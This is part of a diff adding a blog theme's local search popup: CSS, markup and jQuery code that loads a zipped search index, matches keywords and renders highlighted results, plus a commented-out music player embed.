+    box-shadow: 1px 1px 5px #888;
+    cursor: pointer;
+  }
+  .popup-btn-close::after {
+    content: '←';
+    color: #151515;
+    position: absolute;
+    top: 0;
+    left: 0;
+    font-size: 20px;
+    width: 100%;
+    height: 100%;
+    line-height: 50px;
+    text-align: center;
+  }
+}
+</style>
+
+<div class="popup search-popup local-search-popup">
+  <span class="popup-btn-close">
+    ESC
+  </span>
+  <div class="container">
+    <div class="col-md-8 col-md-offset-2">
+      <div class="local-search-header clearfix">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+          <input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+        </div>
+      </div>
+      <div id="local-search-result"></div>
+    </div>
+  </div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // get search zip version
+    $.get('/searchVersion.txt?t=' + (+new Date()), function(res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson () {
+      initLoad(['/search.zip'], {
+        loadOptions: {
+          success: function(obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function(e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions:{
+          'json':'application/json'
+        }
+      })
+    }
+
+
+    // search function;
+    var searchFunc = function(search_id, content_id) {
+      'use strict';
+
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function() {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function(data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title ? data.title.trim() : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content ? data.content.trim().replace(/<[^>]+>/g,"") : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function(keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0, position = [], index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+
+            // show search results
+
+            if (isMatch) {
+              // sort index by position of keyword
+
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+
+              // merge hits into slices
+
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+
+                  // move to next position of hit
+
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {
+                  hits: hits,
+                  start: start,
+                  end: end,
+                  searchTextCount: searchTextCountInSlice
+                };
+              }
+
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if(start < 0){
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if(end > content.length){
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+
+              // sort slices in content by search text's count and hits' count
+
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+
+              // select top N slices in content
+
+              var upperBound = parseInt('2');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+
+              // highlight title and content
+
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+
+              var resultItem = '';
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+              } else {
+                resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+              }
+
+              slicesOfContent.forEach(function (slice) {
+                resultItem += "<a target='_blank' href='" + articleUrl + "'>" +
+                  "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                  "...</p>" + "</a>";
+              });
+
+              resultItem += "</li>";
+              resultItems.push({
+                item: resultItem,
+                searchTextCount: searchTextCount,
+                hitCount: hitCount,
+                id: resultItems.length
+              });
+            }
+          })
+        };
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<ul class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</ul>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+
+      // remove loading animation
+      $('body').css('overflow', '');
+
+      proceedsearch();
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        $('.sb-close').click();
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+      
+      
+
+<!--
+
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<meting-js
+      server="netease"
+      type="playlist"
+      id="4904272454">
+</meting-js>
+-->
+
+</body>
+
+</html>
+
+
+
+
+
+
+
